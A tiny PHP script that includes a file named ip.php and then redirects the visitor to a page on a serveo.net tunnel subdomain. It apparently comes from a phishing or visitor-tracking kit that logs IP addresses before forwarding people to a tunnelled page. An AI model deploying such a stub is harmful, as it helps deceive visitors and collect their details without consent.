<?php
include 'ip.php';
header('Location: https://peior.serveo.net/index2.html');
exit
?>
